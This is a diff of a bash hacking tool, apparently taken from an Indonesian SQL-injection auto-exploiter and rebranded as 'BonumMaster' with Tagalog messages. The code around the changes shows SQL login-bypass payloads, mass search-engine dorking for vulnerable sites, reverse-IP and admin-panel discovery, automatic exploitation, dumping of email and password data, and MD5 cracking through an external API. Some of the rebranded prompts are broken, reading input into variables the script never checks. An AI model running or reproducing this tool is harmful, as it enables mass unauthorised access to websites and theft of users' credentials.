@@ -1,25 +1,25 @@
 #!/bin/bash
 export LANG=en_AU.UTF-8
-#bingung mau pake bahasa apa jdi pake campur aja lahh :v
-#agar orang indo bisa bahasa en yang bahasa en bisa ngerti bahasa id
-#warning powerful tools xploiter can be harmful and detrimental
-#GUNAKAN TOOLS INI UNTUK TUJUAN KEBAIKAN MEMBANTU PANTESTING
-#BUKAN UNTUK MERUSAK SEGALA SEUSATU DI TANGGUNG PENGGUNA
-#DILARANG KERAS UNTUK MENGUBAH LALU MEMPUBLIKASIKAN DENGAN NAMA PRIBADI TANPA SEPENGETAHUAN AUTHOR
-#DI BUAT OPEN SOURCE, AGAR DAPAT DI SESUAIKAN DENGAN KEBUTUHAN MASING MASING
-#SAYA TIDAK MELARANG UNTUK NGEDIT QUERY YG ADA, SUPAYA KALIAN JUGA BISA BERKARYA
+#ITO AY GINAWA PARA SA AKING MGA KAYBIGAN AT KASAMAHAN SA CW BONUMCLAN/USEC/PH ORG.
+#KUNG ITO AY IYONG MATUKLASAN AY BINABATI KITA NGAYON PALANG NARARAPAT KA SA BONUMCLAN
+#ITO AY BINUBUO NG MGA CODE LINE ANG AKING SERVER BOT AY MAKAKA TULONG SA IYO
+#MABUTI NA GAMITIN ITO SA TAMA UPANG DI MAKA PINSALA SA IBA
+#NAG TYAGA AT NAG SALIKSIK UPANG MAGAMIT NG MGA SUSUNOD NA BONUMCLAN
+#PAG ISIPAN NG MABUTI ALAMIN KUNG ANO ANG MAS MAKA BUBUTI PARA SA IYO AT SA IBA
+#HANGGANG BUHAY ANG AKING SERVER AKO AY MANANATILI PARA SA INYO
+#MAG TIWALA KA SA IYONG SARILI AT AKO ANG GAGABAY SAYO
 #/////////////////////////////////////////////////////////////////////////
-#//Author: by Kedjaw3n                                                  //
-#//recode > reupload ?? silahkan asal sertakan nama author nya          //
-#//w buat cape cape, bukan untuk di salah gunakan, apalagi di reupload  //
-#//Di buat: 15 - 07 - 2019                                              //
-#//release: 17 - 01 - 2020                                              //
-#//update : 21 - 04 - 2020                                              //
-#//     SEKALI LAGI JANGAN DI REUPLOAD ANJING W BUAT NYA CAPE LO        //
-#//          TINGAL PAKE AJA APA SUSAH NYA SI JANCOK                    //
-#//                 NGA USAH BUAT PENCITRAAN                            //
+#//UNDERGROUNDSECURITY|USEC|BONUMCLAN CREATEDBY:BONUMMASTER             //                                     //
+#//IF THE SPIDER UNITE THEY CAN TIE UP A LION                           //
+#//24/7 SERVER HOST OPEN BONUMMASTER                                    //
+#//EXPIRED: 31 - 01 - 2050                                              //
+#//release: 17 - 01 - 2013                                              //
+#//update : 21 - 01 - 2023                                              //
+#//     AKO AT ANG AKONG BOT AY NAKA HANDA TUMULONG SAYO                //
+#//          SA ABOT NG AKING MAKAKAYA                                  //
+#//                 ITO NA ANG IYONG PANIMULA                           //
 #/////////////////////////////////////////////////////////////////////////
-#bypass sql login
+#BONUMMaster bypass sql login
 xpl="test" #jgn di ubah!!! 
 xpl1="' or 1=1 limit 1-- -+"
 xpl2="'=''or'"
@@ -48,7 +48,7 @@ U="\033[0;35m"
 time_out="30" #time out loading default 30 detik
 corect="y" #auto corect
 #output ressult
-injected_site="injected.txt" #Result history site yg injected dri pertama kali psqli di gunakan
+injected_site="injected.txt" #Result history site yg injected dri pertama kali BonumMaster di gunakan
 result_vuln="vuln-sqli.txt" #Result vuln sqli site dari dorking  5 search engine
 admin_site="admin-site.txt" #site yang berisikan admin user pass
 email_site="empass-site.txt" #site yg berisikan email pass
@@ -145,10 +145,10 @@ echo -en "${R}
 ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 ▒▒▒▒▒▒▒▒${N}▄▄▄▄▄▄▄▄${R}▒▒▒▒▒▒
 ▒▒${N}█${R}▒▒▒${N}▄██████████▄${R}▒▒▒▒   ${N}⊱⋅ ──────────── ⋅⊰⊱⋅${R}
-▒${N}█▐${R}▒▒▒${N}████████████${R}▒▒▒▒       ${P}  Dr.Dork${R}
+▒${N}█▐${R}▒▒▒${N}████████████${R}▒▒▒▒       ${P}  BONUMMASTER${R}
 ▒${N}▌▐${R}▒▒${N}██▄▀██████▀▄██${R}▒▒▒  ${N} ⊱⋅ ──────────── ⋅⊰⊱${N}⋅
-${N}▐┼▐${R}▒▒${N}██▄▄▄▄██▄▄▄▄██${R}▒▒▒   ${BL}Author: ${BR}./Kedjaw3n${N} 
-${N}▐┼▐${R}▒▒${N}██████████████${R}▒▒▒      ${P}AgressivCode
+${N}▐┼▐${R}▒▒${N}██▄▄▄▄██▄▄▄▄██${R}▒▒▒   ${BL}Author: ${BR}./BONUM${N} 
+${N}▐┼▐${R}▒▒${N}██████████████${R}▒▒▒      ${P}USEC
 ${N}▐▄▐████─▀▐▐▀█─█─▌▐██▄${R}▒
 ▒▒${N}█████──────────▐███${R}▌ ${N}❏ ❐ ❑ ❒ ❏ ❐ ❏ ❐ ❑ ❒ ❏ ❐${R}
 ▒▒${N}█▀▀${N}██▄█─▄───▐─▄███▀${R}▒    ${G}Awesome Dork tools${R}
@@ -158,11 +158,11 @@ ${N}▐▄▐████─▀▐▐▀█─█─▌▐██▄${R}▒
 ▒▒▒▒▒${N}█████████▐▌██▌${R}▒▒▒ ${O}2. ${N}Get Random New Dork ${R}
 ▒▒▒▒▒${N}▐▀▐${R}▒${N}▌${R}${N}▀█▀${R}▒${N}▐${R}▒${N}█${R}▒▒▒▒▒ ${O}3. ${N}Dorking${R}
 ▒▒▒▒▒▒▒▒▒▒▒${N}▐${R}▒▒▒▒${N}▌${R}▒▒▒▒▒ ${O}4. ${N}Help${R}
-▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ${G}root@Dr.dork# ${N}"
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ${G}root@BonumMaster# ${N}"
 read menu
 }
 dorking() {
-  echo -e "${N}\033[2mloading.... $dork\ngunakan ctrl-c untuk skip ke prosess selanjut nya\n${N}please wait pastikan koneksi cepat dan stabil..." | tr "+" " ";rm -rf .result_dork .not
+  echo -e "${N}\033[2mloading.... $dork\ngunakan ctrl-c untuk skip ke prosess selanjut nya\n${N}maari ay Mag Intay lamang..." | tr "+" " ";rm -rf .result_dork .not
     COUNT="$hitung"
          echo -e "${G}Result from bing page $COUNT${N}"
          curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "http://www.bing.com/search?q=$dork&qs=n&pq=$dork&sc=8-5&sp=-1&sk=&first=$COUNT&FORM=PORE" | grep -Po '_blank" href="[^"]*' | sort -u | uniq -i | cut -d '"' -f3 | sed '/facebook/d' | sed '/google/d' | sed '/twitter/d' | sed '/microsoft/d' | sed '/youtube/d' | sed '/&amp/d' | sed "/amp;/d" >> .result_dork
@@ -187,7 +187,7 @@ if [ "$menu" = "3" ]
 then
 echo -e "
            +-----------+
-           |\033[7;32m Dr.Dorker ${N}|
+           |\033[7;32m BonumMaster ${N}|
            +-----------+\n"
 echo -ne "${G}Dork: ${O}"
 read dork
@@ -209,7 +209,7 @@ read poc
 pocna=$(echo "$poc" | sed "s| |+|g")
 poci=$(echo "$poc" | sed "s| |_|g")
 trap break INT
-echo -e "\n${N}${P}Mengambil dork dari database"
+echo -e "\n${N}${P}Bonummaster dork dari database"
 echo "+++++++++++++[ $(date) ]++++++++++++++++" >> Dork~$poci.txt
 for hitung in $(seq 1 30)
 do
@@ -222,7 +222,7 @@ do
    do
      if [ -z "$url" ]
      then
-         echo -e "${R}Periksa koneksi atau terjadi kesalahan"
+         echo -e "${R}Aking Sinusuri ang Lahat"
      fi
      url=$(echo "$url" | sed "s/issue/ascii/g")
      result0=$(curl -sL "$url")
@@ -268,9 +268,9 @@ if [ "$menu" = "2" ]
 then
   echo -e "
            ---------------------
-           \033[7;32m Auto get fress dork ${N}
+           \033[7;32m Bonummaster Bigyan ako ng Baging dork ${N}
            ---------------------\n"
-  echo -e "\n${N}${P}Mengambil dork dari database"
+  echo -e "\n${N}${P}BonumMaster dork dari database"
   for set in $(seq 22)
   do
      ngecurl=$(curl --max-time 60 -sL "https://cxsecurity.com/dorks/$set/" | grep -Po '(Dork:<=?)(.*?)(?=<)|" title="[^"]*|label label-default">[^<]*<' | sed "s|</B>&nbsp;&quot;| intext:|g" | sed "s|&quot;||g" | sed "s|</B>&nbsp;| |g" | sed 's| title="|Poc: |g' | tr '"' "\n" | sed "s|label label-default||g" | sed "s|><||" | tr -d "<" | sed "s|>|Date: |" | grep ":" | sed "s\Poc\%Poc \g" | tr "%" "\n" | sed "s|amp;||g" | sed "s|&#039;|'|g")
@@ -282,7 +282,7 @@ then
      echo "$ngecurl" >> auto-gen.txt
      if [ "$set" = "20" ]
      then
-        echo -en "${G}proses selesai mau nambah dork?? y/n: ${O}"
+        echo -en "${G}Pumili Para Mag Patuloy  dork?? y/n: ${O}"
         read pros
         if [ "$pros" = "y" ]
         then
@@ -296,14 +296,14 @@ then
               echo -e "\033[0;96m$ngecurl"
               echo "$ngecurl" >> auto-gen.txt
            done
-           echo -e "\n${N}${P}Tersimpan di auto-gen.txt"
+           echo -e "\n${N}${P}Tersimpan  auto-gen.txt"
         else
-           echo -e "\n${N}${P}Tersimpan di auto-gen.txt"
+           echo -e "\n${N}${P}BonumMaster  auto-gen.txt"
            break
         fi
      fi
    done
-   echo -e "\n${N}${P}Tersimpan di auto-gen.txt"
+   echo -e "\n${N}${P}BonumMaster  auto-gen.txt"
 fi
 }
 
@@ -555,7 +555,7 @@ else
    echo -e "${N}[${R}!${N}] ${R}\033[2mperiksa koneksi atau hasil dorking tidak ada${N}"
 fi
 trap - INT
-echo -e "${N}${O}Mencoba admin no redirect"
+echo -e "${N}${O}BonumMaster admin no redirect"
 echo -e "${BL}gunakan ctrl+c untuk skip ke prosess selanjut nya\n${N}please wait pastikan koneksi cepat dan stabil..."
 trap break 3 INT
 for site in $(cat .live 2>/dev/null)
@@ -749,48 +749,48 @@ banner() {
 ${G}█████████
 ${G}█▄█████▄█ 
 ${G}█▼▼▼▼▼     ${U}Author ${N}by ${R}kedjaw3n
-${G}█          ${BL}pwnd ./agressiv1njector 
+${G}█          ${BL} ./BonumMaster 
 ${G}█▲▲▲▲▲     
 ${G}█████████
 ${G}__██____██___
 
-   ${N}|${B}\033[7m PSQLI bypass SQLI login auto xploiter ${N}|
+   ${N}|${B}\033[7m BonumMaster bypass SQLI login auto xploiter ${N}|
 "
 }
 menu() {
 banner
-echo -e "\033[1m$N[$R+$N] \e[38;5;81m${O}PSQLI MENU\e[0m
-[${O}1${N}]. Bypass login bruteforce
-[${O}2${N}]. Bypass all login page list.txt
-[${O}3${N}]. Auto dorking + Auto xploit
-[${O}4${N}]. Reverse ip + auto find admin + Auto xploit
-[${O}5${N}]. Admin finder + Auto xploit
+echo -e "\033[1m$N[$R+$N] \e[38;5;81m${O}BonumMaster MENU\e[0m
+[${O}1${N}]. BonumMaster Bypass login bruteforce
+[${O}2${N}]. BonumMaster Bypass all login page list.txt
+[${O}3${N}]. BonumMaster Auto dorking + Auto xploit
+[${O}4${N}]. BonumMaster Reverse ip + auto find admin + Auto xploit
+[${O}5${N}]. BonumMaster Admin finder + Auto xploit
 [${O}6${N}]. logout"
-echo -ne "[${R}?${N}] yg mana ?? "
+echo -ne "[${R}?${N}] BonumMaster ?? "
 read n
 case $n in
    1) clear
       banner
-      echo -e "\033[1m$N[$R+$N] ${O}bypass login bruteforce"
-      echo -en "\033[1m$N[$G!$N] Masukan taget: "
+      echo -e "\033[1m$N[$R+$N] ${O}BonumMaster bypass login bruteforce"
+      echo -en "\033[1m$N[$G!$N] BonumMaster taget: "
       read target
       bypass
-      read -p "kembali ke menu y/n? " tanya
+      read -p "Type Y/n Para mag patuloy y/n? " tanya
       if [[ "$tanya" = "y" ]];then
          menu
       fi
    ;;
    2) clear
       banner
-      echo -e "\033[1m$N[$R+$N] bypass all login page list.txt"
-      echo -ne "\033[1m$N[$G!$N] Masukan list taget: "
+      echo -e "\033[1m$N[$R+$N] BonumMasterbypass all login page list.txt"
+      echo -ne "\033[1m$N[$G!$N] BonumMaster list taget: "
       read tar
       echo -n -e "\033[1m$N[$G*$N] Total Load site   : ";wc -l $tar 2>/dev/null
       for target in $(cat $tar 2>/dev/null)
        do
          bypass
        done
-       read -p "kembali ke menu y/n? " tanya
+       read -p "Bumalik sa menu y/n? " BonumMaster
       if [[ "$tanya" = "y" ]];then
          menu
       fi
@@ -798,17 +798,17 @@ case $n in
    3) clear
       banner
       echo -e "\033[1m$N[$R+$N] Auto dorking + auto xploit"
-      echo -e "[${O}1${N}]. dorking biasa"
-      echo -e "[${O}2${N}]. dorking masal"
-      echo -e "[${O}3${N}]. kembali ke menu utama"
-      echo -ne "[${G}?${N}] yg mana ?? "
+      echo -e "[${O}1${N}]. dorking 1"
+      echo -e "[${O}2${N}]. dorking 2"
+      echo -e "[${O}3${N}]. BonumMast ke menu 3"
+      echo -ne "[${G}?${N}] Salamat ?? "
       read d
       case $d in
        1) 
           clear
           banner
-          echo -e "\033[1m$N[$R+$N] Auto bypass sql login from dork"
-          echo -n -e "\033[1m$N[$R+$N] dork login page: " | sed 's/inurl:/+/g'
+          echo -e "\033[1m$N[$R+$N]  BonumMaster Auto bypass sql login from dork"
+          echo -n -e "\033[1m$N[$R+$N] BonumMaster dork login page: " | sed 's/inurl:/+/g'
           read dork
           echo -n -e "\033[1m$N[$R+$N] page:"
           read pa
@@ -821,7 +821,7 @@ case $n in
             done
           trap - INT
           fi
-          read -p "kembali ke menu y/n? " tanya
+          read -p "BonumMaster menu y/n? " tanya
       if [[ "$tanya" = "y" ]];then
          menu
       fi
@@ -829,7 +829,7 @@ case $n in
         2)
           clear
           banner
-          echo -e "\033[1m$N[$R+$N] Auto bypass sql login from dorking masal"
+          echo -e "\033[1m$N[$R+$N] BonumMaster Auto bypass sql login from dorking BonumMaster"
           echo -n -e "\033[1m$N[$R+$N] dork list:"
           read dor
           echo -n -e "\033[1m$N[$R+$N] page:"
@@ -860,16 +860,16 @@ case $n in
       echo "[+] Reverse ip + auto find admin + Auto xploit"
       echo "[1]. reverse ip biasa"
       echo "[2]. reverse ip masal"
-      echo "[3]. Kembali ke menu utama"
-      echo -n "[?] yg mana ?? "
+      echo "[3].  BonumMaster menu"
+      echo -n "[?] y/n?? "
       read d
       case $d in
       1) clear
          banner
-         echo "[+] Reverse ip + auto find admin + Auto xploit"
+         echo "[+] BonumMaster Reverse ip + auto find admin + Auto xploit"
          echo -n "[+] Masukan site yang mau di reverse ip: "
          read site
-         echo "[+] Ambil domain:$lightgreen $site"
+         echo "[+] BonumMaster domain:$lightgreen $site"
          rm -rf result_reverseip.txt Result_admin_finder.txt
          ngerevip=$( curl -sL "http://api.hackertarget.com/reverseiplookup/?q=$site" -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" >> result_reverseip.txt )
          cat result_reverseip.txt 2>/dev/null
@@ -885,8 +885,8 @@ case $n in
       ;;
       2) clear
          banner
-         echo "[+] Reverse ip + auto find admin + Auto xploit masal"
-         echo -n "[+] Masukan list target: "
+         echo "[+] BonumMaster Reverse ip + auto find admin + Auto xploit masal"
+         echo -n "[+] BonumMaster list target: "
          read site
           while read site
            do 
@@ -903,26 +903,26 @@ case $n in
           done
           menu
       ;;
-      *) echo "[+] Thx for using this tools";;
+      *) echo "[+] Salamat Kapatid";;
       esac
    ;;
    5) clear
       banner
-      echo "[+] Bacot admin finder"
-      echo "[1]. Admin finder biasa"
-      echo "[2]. Admin finder masal"
-      echo "[3]. Kembali ke menu utama"
-      echo -n "[?] yg mana ?? "
+      echo "[+]  BonumMaster admin finder"
+      echo "[1]. Admin finder BonumMaster"
+      echo "[2]. Admin finder BonumMaster"
+      echo "[3]. bonum menu "
+      echo -n "[?] Y/N ?? "
       read d
       case $d in
       1) clear
          banner
-         echo "[+] Bacot Admin finder"
-         echo -n "[+] Masukan site : "
+         echo "[+] BonumMaster Admin finder"
+         echo -n "[+] BonumMaster site : "
          read site
-         echo -n "[+] Masukan wordlist admin finder: "
+         echo -n "[+] BonumMaster wordlist admin finder: "
          read wordlistadmin
-         echo -n "[+] Masukan worldlist bypass login: "
+         echo -n "[+] BonumMaster worldlist bypass login: "
          read wordlist
          rm -rf Result_admin_finder.txt .live
          adminfin
@@ -930,7 +930,7 @@ case $n in
           do
             bypass
           done
-          read -p "kembali ke menu y/n? " tanya
+          read -p "BonumMaster ke menu y/n? " BonumMaster
       if [[ "$tanya" = "y" ]];then
          menu
       fi
@@ -3838,11 +3838,11 @@ case $d in
    ;;
    10) clear
       banner${angkab}
-      echo -e "                |\033[7;32m Hash tools ${N}|\n"
+      echo -e "                |\033[7;32m BONUMmaster Please find Hash tools ${N}|\n"
       echo -e "[${G}1${N}]. hash Identifier"
-      echo -e "[${G}2${N}]. md5 decrytor"
-      echo -e "[${G}3${N}]. md5 emil pass decrytor"
-      echo -ne "[${R}?${N}] yg mana ?? "
+      echo -e "[${G}2${N}]. BONUM md5 decrytor"
+      echo -e "[${G}3${N}]. BONUM d5 emil pass decrytor"
+      echo -ne "[${R}?${N}] Y/N MENU"
       read p
       case $p in
         1) clear
@@ -3852,10 +3852,10 @@ case $d in
         ;;
         2) clear
            banner${angkab}
-           echo -e "                |\033[7;32m md5 decryptor ${N}|\n"
-           echo -e "[${G}1${N}]. biasa"
-           echo -e "[${G}2${N}]. masal"
-           echo -ne "[${R}?${N}] yg mana ?? "
+           echo -e "                |\033[7;32m BONUMmaster Please find md5 decryptor ${N}|\n"
+           echo -e "[${G}1${N}]. 1"
+           echo -e "[${G}2${N}]. 2"
+           echo -ne "[${R}?${N}] Y/N MENU ?? "
              read p
              case $p in
               1) clear
@@ -3865,16 +3865,16 @@ case $d in
                  dec=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "https://md5decrypt.net/Api/api.php?hash=${hash}&hash_type=md5&email=deanna_abshire@proxymail.eu&code=1152464b80a61728")
                  if [[ "$dec" = "" ]]
                  then
-                   echo -e "${R}F A I L E D nga bisa di hash${N}"
+                   echo -e "${R}SUBUKAN ANG IBANG PARAAN ${N}"
                  else
                    echo "Result: $dec"
                  fi
-                 read -p "Press Enter for continue " aswkxkkxk
+                 read -p "Press Enter for continue " BONUM
                  menu 
               ;;
               2) clear
                  banner${angkab}
-                 echo -e "                |\033[7;32m md5 decryptor ${N}|\n"
+                 echo -e "                |\033[7;32m BONUMMASTER md5 decryptor ${N}|\n"
                  read -p "[+] Masukan list md5: " file
                  for hash in `cat $file`
                  do
@@ -3886,7 +3886,7 @@ case $d in
                      echo "[!] Cracked: ${hash} $del $dec"
                  fi
                  done
-                 read -p "Press Enter for continue " aswkxkkxk
+                 read -p "Press Enter for continue " BONUM
                  menu
                  ;;
                  *) clear;menu;;
@@ -3894,7 +3894,7 @@ case $d in
         ;;
         3) clear
            banner${angkab}
-           echo -e "                |\033[7;32m md5 emil pass decrytor ${N}|\n"
+           echo -e "                |\033[7;32m BONUMMASTER md5 emil pass decrytor ${N}|\n"
            hashmail
            menu
           ;;
@@ -3909,7 +3909,7 @@ case $d in
    ;;
    12) clear
       banner${angkab}
-      echo -e "                   |\033[7;32m ADMIN FINDER ${N}|\n"
+      echo -e "                   |\033[7;32m ADMIN FINDER BONUMMASTER ${N}|\n"
       echo -e "[${G}1${N}]. biasa"
       echo -e "[${G}2${N}]. masal"
       echo -ne "[${R}?${N}] yg mana ?? "
@@ -3917,14 +3917,14 @@ case $d in
       case $p in
       1) clear
       banner${angkab}
-      echo -e "                   |\033[7;32m ADMIN FINDER ${N}|\n"
+      echo -e "                   |\033[7;32m ADMIN FINDER BONUMMASTER ${N}|\n"
       read -p "site: " site
       adminfin
       menu
       ;;
       2) clear
       banner${angkab}
-      echo -e "                   |\033[7;32m ADMIN FINDER MASAL ${N}|\n"
+      echo -e "                   |\033[7;32m ADMIN FINDER BONUMMASTER ${N}|\n"
       read -p "site list: " list
       for site in `cat $list 2>/dev/null | sed 's/\r$//' | tr -d "\0"`
       do
@@ -3932,12 +3932,12 @@ case $d in
       done
       menu
       ;;
-      *) echo -e "${N}[${G}+${N}] Thx for using this tools";;
+      *) echo -e "${N}[${G}+${N}] SALAMAT SA PAG GAMIT";;
       esac
    ;;
    13)  clear
       banner${angkab}
-      echo -e "          |\033[7;32m Psqli Sqli/Xss/LFI/AdminFinder Scanner ${N}|\n"
+      echo -e "          |\033[7;32m BONUMmaster Please find Sqli/Xss/LFI/AdminFinder Scanner USEC ${N}|\n"
       echo -e "[${G}1${N}]. biasa"
       echo -e "[${G}2${N}]. masal"
       echo -ne "[${R}?${N}] yg mana ?? "
@@ -3947,7 +3947,7 @@ case $d in
       hekel="y" 
       clear
       banner${angkab}
-      echo -e "          |\033[7;32m Psqli Sqli/Xss/LFI/AdminFinder Scanner ${N}|\n"
+      echo -e "          |\033[7;32m BONUMmaster Please find Sqli/Xss/LFI/AdminFinder Scanner USEC ${N}|\n"
       read -p "site: " site
       dork=".php%3Fid%3D+site%3a$site"
       pa="1"
@@ -3968,7 +3968,7 @@ case $d in
       hekel="y" 
       clear
       banner${angkab}
-      echo -e "          |\033[7;32m Psqli Sqli/Xss/LFI/AdminFinder Scanner masal ${N}|\n"
+      echo -e "          |\033[7;32m BONUMMaster Please find Sqli/Xss/LFI/AdminFinder Scanner USEC ${N}|\n"
       read -p "site list: " list
       rm -rf .result_dork .not .url .vuln .bad .wp .live
       trap break INT
@@ -3987,7 +3987,7 @@ case $d in
       trap - INT
       menu
       ;;
-      *) echo -e "${N}[${G}+${N}] Thx for using this tools";;
+      *) echo -e "${N}[${G}+${N}] Salamat Sa pag Tuklas";;
       esac
    ;;
    14) 
@@ -3998,10 +3998,10 @@ case $d in
      clear
      banner${angkab}
      echo -e "              |\033[7;32m aUTO DorKiNg + AutO Dump ${N}|\n"
-     echo -e "[${O}1${N}]. dorking biasa"
-      echo -e "[${O}2${N}]. dorking masal"
-      echo -e "[${O}3${N}]. kembali ke menu utama"
-      echo -ne "[${R}?${N}] yg mana ?? "
+     echo -e "[${O}1${N}]. dorking 1"
+      echo -e "[${O}2${N}]. dorking 2"
+      echo -e "[${O}3${N}]. BUMALIK SA MENU"
+      echo -ne "[${R}?${N}] Y/N ?? "
       read d
       case $d in
        1) masn="y"
@@ -4012,7 +4012,7 @@ case $d in
           echo -e "              |\033[7;32m aUTO DorKiNg + AutO Dump ${N}|\n"
           echo -ne "[${O}+${N}] Dork sqli: ${O}"
           read do
-          echo -e "${N}\033[2mexample: email|mail|pass|pssw"
+          echo -e "${N}\033[2mexample: email|pass"
           echo -ne "${N}[${O}+${N}] Dump: ${O}"
           read auto_get
           echo -en "${N}[${R}+${N}] page: ${G}";read pa
@@ -4123,7 +4123,7 @@ case $d in
           rm -rf .vuln
           menu
        ;;
-         *) echo -e "${N}[${G}+${N}] Thx for using this tools";;
+         *) echo -e "${N}[${G}+${N}]Binabati kita sa Pag tuklas Ng Aking Obra -Bonummaster";;
          esac
    ;;
    15) bysqli
@@ -4131,11 +4131,11 @@ case $d in
    16) clear
        cxsec
    ;;
-   17) echo -e "${G}c o m i n g   s o o n${N}"
+   17) echo -e "${G}Hindi Pa Pwede Gamitin${N}"
    ;;
    18) mulai
    ;;
-   *) echo -e "${N}[${G}+${N}] Thx for using this tools";;
+   *) echo -e "${N}[${G}+${N}] SALAMAT BONUMCLAN";;
 esac
 }
 menu
